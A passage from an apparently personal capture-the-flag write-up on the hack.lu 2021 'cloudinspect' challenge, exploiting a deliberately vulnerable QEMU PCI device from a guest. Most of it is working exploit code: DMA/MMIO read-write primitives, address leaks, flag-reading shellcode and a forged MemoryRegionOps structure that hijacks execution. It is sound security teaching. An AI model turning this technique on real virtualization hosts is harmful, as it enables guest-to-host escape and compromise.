		<span class="c1">// asserts the bit IS_PRESENT is set
</span><span class="c1"></span>		<span class="n">phys</span> <span class="o">=</span> <span class="p">(</span><span class="n">phys</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">54</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">;</span>
		<span class="c1">// flips out the status bits, and shifts the physical frame address to 64 bits
</span><span class="c1"></span>		<span class="k">return</span> <span class="n">phys</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>To interact with the device we can write the code right bellow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">iomem</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dmabuf</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">dmabuf_phys_addr</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="cp">#define PATH &#34;/sys/devices/pci0000:00/0000:00:02.0/resource0&#34;
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">iowrite</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
		<span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">ioread</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
		<span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">write_dmabuf</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
		<span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">read_offt</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
		<span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">PATH</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_SYNC</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">fd1</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Cannot open %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">PATH</span><span class="p">);</span>
				<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
		<span class="p">}</span> <span class="c1">// open resource0 to interact with the device
</span><span class="c1"></span>		
		<span class="n">iomem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// map resource0
</span><span class="c1"></span>		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;iomem @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">iomem</span><span class="p">);</span>
		
		<span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/self/pagemap&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
				<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="n">dmabuf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
		<span class="n">memset</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">));</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">MAP_FAILED</span> <span class="o">==</span> <span class="n">iomem</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="n">mlock</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span> <span class="c1">// trigger PAGE_FAULT to acually map the page
</span><span class="c1"></span>		<span class="n">dmabuf_phys_addr</span> <span class="o">=</span> <span class="n">virt2phys</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">);</span> <span class="c1">// grab physical address according to pagemap
</span><span class="c1"></span>		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;DMA buffer (virt) @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dmabuf</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;DMA buffer (phys) @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Now we can interact with the device we got two primitive of arbitrary read / write. The <code>read_offt</code> and <code>write_dmabuf</code> functions permit us to read / write a 8 bytes to an arbitrary offset from the <code>dmabuf</code> object address.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>I did a lot of things which didn&rsquo;t worked, so let&rsquo;s summarize all my thoughts:</p>
<ul>
<li>If we leak the object&rsquo;s address, we can write at any location for which we know the base address, for example overwrite GOT pointers (but it will not succeed because of RELRO).</li>
<li>If we take a look at all the memory areas mapped in the qemu process we can see very large memory area in rwx, which means if we can leak its address and if we can redirect RIP, we just have to write and jmp on a shellcode written in this area.</li>
<li>To achieve the leaks, given that the CloudInspectState structure is allocated on the heap, and that we can read / write at an arbitrary offset from the object&rsquo;s address we can:
<ul>
<li>Scan heap memory for pointers to the qemu binary to leak the base address of the binary.</li>
<li>Scan heap memory  for pointers to the heap itself (next, prev pointers for freed objects for example), and then compute the object&rsquo;s address.</li>
<li>Scan heap memory to leak the rwx memory area</li>
<li>Scan all the memory area we can read to find a leak of the rwx memory area.</li>
</ul>
</li>
<li>To redirect RIP I thought to:
<ul>
<li>Overwrite the <code>destructor</code> function pointer in the <code>MemoryRegion</code> structure.</li>
<li>Write in a writable area a fake <code>MemoryRegionOps</code> structure  for which a certain handler points to our shellcode and make <code>CloudInspectState.mmio.ops</code> point to it.</li>
</ul>
</li>
</ul>
<p>According to the environment, scan the heap memory is not reliable at all. I succeed to leak the rwx memory area, the binary base address, the heap base address from some contiguous objects in the heap. To redirect RIP, for some reason, the <code>destructor</code> is never called, so we have to craft a fake <code>MemoryRegionOps</code> structure. And that&rsquo;s how I read the flag on the disk. But the issue is that remotely, the offset between the heap base and the object is not the same, furthermore, the offset for the rwx memory leak is I guess different as well. So we have to find a different way to leak the object and the rwx memory area.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="leak-some-memory-areas">
        Leak some memory areas
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#leak-some-memory-areas" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak some memory areas" href="#leak-some-memory-areas">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>To see where we can find pointers to the rwx memory area, we can make use of the <code>search</code> command in <code>pwndbg</code>:</p>
<pre tabindex="0"><code>pwndbg&gt; vmmap                                                                                                                                                                              
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                                                                                                                            
    0x559a884e1000     0x559a88791000 r--p   2b0000 0      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a88791000     0x559a88c5d000 r-xp   4cc000 2b0000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a88c5d000     0x559a890ff000 r--p   4a2000 77c000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89100000     0x559a89262000 r--p   162000 c1e000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89262000     0x559a89353000 rw-p    f1000 d80000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89353000     0x559a89377000 rw-p    24000 0      [anon_559a89353]                                                                                                                    
    0x559a8a059000     0x559a8b0e7000 rw-p  108e000 0      [heap]                                                                                                                              
    0x7fc5f4000000     0x7fc5f4a37000 rw-p   a37000 0      [anon_7fc5f4000]                                                                                                              
    0x7fc5f4a37000     0x7fc5f8000000 ---p  35c9000 0      [anon_7fc5f4a37]                                                                                                                    
    0x7fc5fbe00000     0x7fc603e00000 rw-p  8000000 0      [anon_7fc5fbe00]                                                                                                                    
    0x7fc603e00000     0x7fc603e01000 ---p     1000 0      [anon_7fc603e00]                                                                                                                    
    0x7fc604000000     0x7fc643fff000 rwxp 3ffff000 0      [anon_7fc604000]                                                                                                                  
    [SKIP]
pwndbg&gt; search -4 0x7fc60400 -w                                                                                                                                                                
[anon_559a89353] 0x559a89359002 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a8935904a 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a89359052 0x1600007fc60400                                                                                                                                               
[anon_559a89353] 0x559a8935905a 0x2d00007fc60400                                                                                                                                               
[anon_559a89353] 0x559a89359062 0xffd300007fc60400                                                                                                                                             
[anon_559a89353] 0x559a89359072 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a89372b2a 0x10100007fc60400                                                                                                                                              
[anon_559a89353] 0x559a89372bb2 0x100000007fc60400                                                                                                                                             
[anon_559a89353] 0x559a89372bba 0xf00000007fc60400                                                                                                                                             
[heap]          0x559a8a2dccf2 0x2d00007fc60400                                                                                                                                                
[heap]          0x559a8a2dccfa 0x7fc60400                                                                                                                                                      
[heap]          0x559a8a2dcd6a 0x7fc60400                                                                                                                                                      
[heap]          0x559a8a2dcefa 0xffd300007fc60400                                                                                                                                              
[heap]          0x559a8a2dcf18 0x7fc60400                                                                                                                                                      
[SKIP]
</code></pre><p>Given that we don&rsquo;t want to get the leak from heap because of the unreliability we can see that there are available leaks in a writable area of the binary in <code>anon_559a89353</code>, indeed the page address looks like a PIE based binary address or an heap address (but the address is not marked heap), and if we look more carefully, the page is contiguous to the last file mapped memory area. Now we can leak the rwx memory area, lets' find a way to leak object&rsquo;s address! I asked on the hack.lu discord a hint for this leak because didn&rsquo;t have any idea. And finally it&rsquo;s quite easy, we can just leak the <code>opaque</code> pointer in the <code>MemoryRegion</code> structure which points to the object&rsquo;s address.</p>
<p>If I summarize we have:</p>
<ul>
<li>A reliable leak of:
<ul>
<li>the object&rsquo;s address with the <code>opaque</code> pointer</li>
<li>the binary base address (from the heap)</li>
<li>the rwx memory area (writable memory area that belongs to the binary).</li>
</ul>
</li>
</ul>
<p>Then we can write this code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// offset I got in gdb locally
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x10c0</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xdef90</span><span class="p">;</span> <span class="c1">// heap leak
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">bss</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xbc2000</span><span class="p">;</span> <span class="c1">// points to the anonnymous memory area right after the binary
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xf3bff0</span><span class="p">;</span> <span class="c1">// useless
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">ops_struct</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">);</span> <span class="c1">// That&#39;s &amp;ClouInspctState.mmio.ops
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">addr_obj</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0xd0</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="mi">2568</span><span class="p">;</span> <span class="c1">// CloudInspectState.mmio.opaque
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">leak_rwx</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">((</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">-</span> <span class="n">addr_obj</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffff</span><span class="p">;</span> <span class="c1">// leak in the bss
</span><span class="c1"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] ops_struct: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Binary base address: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Heap base address: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leak rwx: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Addr obj: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">addr_obj</span><span class="p">);</span>

<span class="cm">/*
</span><span class="cm">[*] ops_struct: 559a89173f20
</span><span class="cm">[*] Binary base address: 559a88791000
</span><span class="cm">[*] Heap base address: 559a8a0561d0
</span><span class="cm">[*] Leak rwx: 7fc604000000
</span><span class="cm">[*] Addr obj: 559a8af92f88
</span><span class="cm">*/</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h3 id="write-the-shellcode">
        Write the shellcode
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#write-the-shellcode" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Write the shellcode" href="#write-the-shellcode">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>I choose to write a shellcode to read the flag at <code>leak_rwx + 0x5000</code>, a known location we can easily read and print from the program. The shellcode is very simple:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; SYS_open</span>
<span class="nf">push</span> <span class="mh">0x67616c66</span> <span class="c1">; flag in little endian</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span> <span class="c1">; pointer flag string</span>
<span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mi">0</span> <span class="c1">; O_READ</span>
<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x1fd</span> <span class="c1">; mode ?</span>
<span class="nf">syscall</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span> <span class="c1">; fd</span>
<span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span> <span class="c1">; SYS_read</span>
<span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">rip</span><span class="p">]</span> <span class="c1">; pointer to the rwx memory area (cause we&#39;re executing code within)</span>
<span class="nf">and</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0xffffffffff000000</span> <span class="c1">; compute the base address</span>
<span class="nf">add</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0x5000</span> <span class="c1">; add the right offset</span>
<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x30</span> <span class="c1">; length of the flag to read</span>
<span class="nf">syscall</span>
<span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="c1">; we pushed the flag str so we destroy it</span>
<span class="nf">ret</span> <span class="c1">; return to continue the execution</span>
</code></pre></div><p>To write the shellcode at <code>leak_rwx + 0x1000</code>, we can directly trigger a large write primitive:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define CODE &#34;\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3&#34;
</span><span class="cp"></span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="n">CODE</span><span class="p">,</span> <span class="mi">130</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Writing the shellcode @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">-</span> <span class="n">addr_obj</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">130</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
<span class="cm">/*
</span><span class="cm">[*] Writing the shellcode @ 7fc604001000
</span><span class="cm">*/</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h3 id="craft-fake-memoryregionops-structure">
        Craft fake MemoryRegionOps structure
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#craft-fake-memoryregionops-structure" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Craft fake MemoryRegionOps structure" href="#craft-fake-memoryregionops-structure">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>To cratf a fake <code>MemoryRegionOps</code>, I just read the original <code>MemoryRegionOps</code> structure, I edited the <code>read</code> handler, and I wrote it back, in a writable memory area, at <code>leak_rwx+0x2000</code>. Given that <code>sizeof(MemoryRegionOps)</code> is not superior to <code>DMA_SIZE</code>, I can read and write in one time. Then we got:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// Craft fake MemoryRegionOps structure by reading the original one
</span><span class="c1"></span>
<span class="k">struct</span> <span class="n">MemoryRegionOps</span> <span class="n">fake_ops</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] reading struct mmio.MemoryRegionOps @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>

<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="o">-</span><span class="p">(</span><span class="n">addr_obj</span> <span class="o">-</span> <span class="n">ops_struct</span><span class="p">));</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">);</span>

<span class="c1">// Write it in the fake struct
</span><span class="c1"></span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake_ops</span><span class="p">,</span> <span class="n">dmabuf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>
<span class="n">fake_ops</span><span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="p">(</span><span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span> 
<span class="c1">// Edit the handler we want to hook to make it point to the shellcode at leak_rwx + 0x1000
</span><span class="c1"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] fake_ops.read = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_ops</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>

<span class="c1">// patch it and write it @ leak_rwx + 0x2000
</span><span class="c1"></span><span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">-</span> <span class="n">addr_obj</span> <span class="o">+</span> <span class="mh">0x2000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h3 id="hook-mmioops--profit">
        Hook mmio.ops + PROFIT
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#hook-mmioops--profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Hook mmio.ops &#43; PROFIT" href="#hook-mmioops--profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>We just have to replace the original <code>CoudInspect.mmio.ops</code> pointer to a pointer to the <code>fake_ops</code> structure.
Then, next time we send a read request, the shellcode will be executed! And we will just need to retablish the original <code>CoudInspect.mmio.ops</code> pointer to read the flag at <code>leak_rwx+0x5000</code>! Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="o">+</span><span class="mh">0x2000</span><span class="p">);</span>
<span class="c1">// Set the pointer to the MemoryRegionOps to the fake MemoryRegionOps	
</span><span class="c1"></span>
<span class="n">ioread</span><span class="p">(</span><span class="mh">0x37</span><span class="p">);</span> <span class="c1">// trigger the read handler we control, then the shellcode is 
</span><span class="c1">// executed and the flag is written @ leak_rwx + 0x5000[enter link description here](cloudinspect)
</span><span class="c1"></span>
